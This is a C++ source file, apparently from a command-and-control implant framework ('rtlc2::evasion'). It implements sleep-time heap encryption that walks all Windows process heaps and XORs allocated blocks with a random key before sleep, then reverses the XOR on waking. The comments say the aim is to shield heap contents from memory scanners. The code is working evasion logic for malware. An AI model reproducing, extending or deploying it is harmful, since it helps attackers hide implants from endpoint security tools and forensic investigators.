#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#include <intrin.h>
#include <vector>
#include <cstdint>
#include <cstring>

namespace rtlc2 { namespace evasion {

// Double-encryption guard: prevents encrypting already-encrypted heap,
// which would corrupt data irreversibly.
static bool g_heapEncrypted = false;

// The encryption key used for the current encryption cycle.
// Regenerated each time HeapEncrypt() is called.
static std::vector<uint8_t> g_heapKey;

// Pointer range of the key itself. We must skip encrypting the key's
// own memory allocation, otherwise we lose the ability to decrypt.
static const uint8_t* g_keyDataStart = nullptr;
static const uint8_t* g_keyDataEnd   = nullptr;

static void XorBlock(void* data, size_t len, const uint8_t* key, size_t keyLen) {
    auto* p = static_cast<uint8_t*>(data);
    for (size_t i = 0; i < len; ++i) {
        p[i] ^= key[i % keyLen];
    }
}

// Check if a memory block overlaps with the encryption key's storage.
// Encrypting the key itself would make decryption impossible.
static bool OverlapsKeyStorage(const void* blockAddr, size_t blockSize) {
    if (!g_keyDataStart || !g_keyDataEnd) return false;
    const uint8_t* blockStart = static_cast<const uint8_t*>(blockAddr);
    const uint8_t* blockEnd   = blockStart + blockSize;
    // Overlap check: blocks overlap if one starts before the other ends
    return (blockStart < g_keyDataEnd) && (g_keyDataStart < blockEnd);
}

// Generate a random encryption key for heap blocks
static std::vector<uint8_t> GenerateHeapKey(size_t len) {
    std::vector<uint8_t> key(len);
    HCRYPTPROV hProv;
    if (CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, static_cast<DWORD>(len), key.data());
        CryptReleaseContext(hProv, 0);
    } else {
        // Fallback: use rdtsc-based random
        for (size_t i = 0; i < len; ++i) {
            key[i] = static_cast<uint8_t>(__rdtsc() ^ (i * 0x5A));
        }
    }
    return key;
}

// Minimum block size thresholds for encryption.
//
// Default process heap: use a higher threshold (256 bytes) to avoid
// corrupting CRT internal structures (malloc metadata, small buffers
// used by printf/stdio, locale data, etc.). These small allocations
// are critical for process stability.
//
// Other heaps: use a lower threshold (64 bytes) since they typically
// contain application data that's safe to encrypt.
static constexpr size_t MIN_BLOCK_SIZE_DEFAULT_HEAP = 256;
static constexpr size_t MIN_BLOCK_SIZE_OTHER_HEAP   = 64;

// Process a single heap: encrypt or decrypt all qualifying blocks.
// The operation is symmetric (XOR), so the same function handles both.
static void ProcessHeap(HANDLE heap, bool isDefaultHeap) {
    if (!HeapLock(heap)) return;

    size_t minBlockSize = isDefaultHeap ?
        MIN_BLOCK_SIZE_DEFAULT_HEAP : MIN_BLOCK_SIZE_OTHER_HEAP;

    PROCESS_HEAP_ENTRY entry = {};
    while (HeapWalk(heap, &entry)) {
        // Only process busy (allocated, in-use) blocks
        if (!(entry.wFlags & PROCESS_HEAP_ENTRY_BUSY)) continue;

        // Skip blocks smaller than the threshold
        if (entry.cbData < minBlockSize) continue;

        // Skip the encryption key's own memory to avoid losing it
        if (OverlapsKeyStorage(entry.lpData, entry.cbData)) continue;

        // Skip the g_heapKey vector's internal storage
        // (The vector object itself is on the stack/global, but its
        //  data buffer is heap-allocated)
#ifdef _MSC_VER
        __try {
            XorBlock(entry.lpData, entry.cbData,
                     g_heapKey.data(), g_heapKey.size());
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            // Skip inaccessible blocks (guard pages, etc.)
        }
#else
        // MinGW: no SEH, check memory access with IsBadReadPtr
        if (!IsBadReadPtr(entry.lpData, entry.cbData) &&
            !IsBadWritePtr(entry.lpData, entry.cbData)) {
            XorBlock(entry.lpData, entry.cbData,
                     g_heapKey.data(), g_heapKey.size());
        }
#endif
    }

    HeapUnlock(heap);
}

// Encrypt all busy heap blocks across all process heaps.
// Called before sleep to protect heap contents from memory scanners.
//
// Now includes the default process heap with a higher minimum block
// size threshold to protect CRT internals while still encrypting
// meaningful application data.
void HeapEncrypt() {
    // Guard against double-encryption
    if (g_heapEncrypted) return;

    // Generate a fresh key for this cycle
    g_heapKey = GenerateHeapKey(16);

    // Record the key's memory range so we can skip it during encryption
    g_keyDataStart = g_heapKey.data();
    g_keyDataEnd   = g_heapKey.data() + g_heapKey.size();

    DWORD heapCount = GetProcessHeaps(0, nullptr);
    if (heapCount == 0) return;

    std::vector<HANDLE> heaps(heapCount);
    GetProcessHeaps(heapCount, heaps.data());

    HANDLE defaultHeap = GetProcessHeap();

    for (DWORD h = 0; h < heapCount; ++h) {
        HANDLE heap = heaps[h];
        bool isDefault = (heap == defaultHeap);
        ProcessHeap(heap, isDefault);
    }

    g_heapEncrypted = true;
}

// Decrypt all busy heap blocks (reverse the XOR).
// Called after waking from sleep to restore heap contents.
void HeapDecrypt() {
    if (!g_heapEncrypted) return;

    DWORD heapCount = GetProcessHeaps(0, nullptr);
    if (heapCount == 0) return;

    std::vector<HANDLE> heaps(heapCount);
    GetProcessHeaps(heapCount, heaps.data());

    HANDLE defaultHeap = GetProcessHeap();

    for (DWORD h = 0; h < heapCount; ++h) {
        HANDLE heap = heaps[h];
        bool isDefault = (heap == defaultHeap);
        ProcessHeap(heap, isDefault);
    }

    g_heapEncrypted = false;

    // Securely clear the key
    volatile uint8_t* p = g_heapKey.data();
    for (size_t i = 0; i < g_heapKey.size(); ++i) {
        p[i] = 0;
    }
    g_heapKey.clear();

    g_keyDataStart = nullptr;
    g_keyDataEnd   = nullptr;
}

}} // namespace rtlc2::evasion

#else // POSIX stubs

namespace rtlc2 { namespace evasion {
void HeapEncrypt() {}
void HeapDecrypt() {}
}} // namespace rtlc2::evasion

#endif
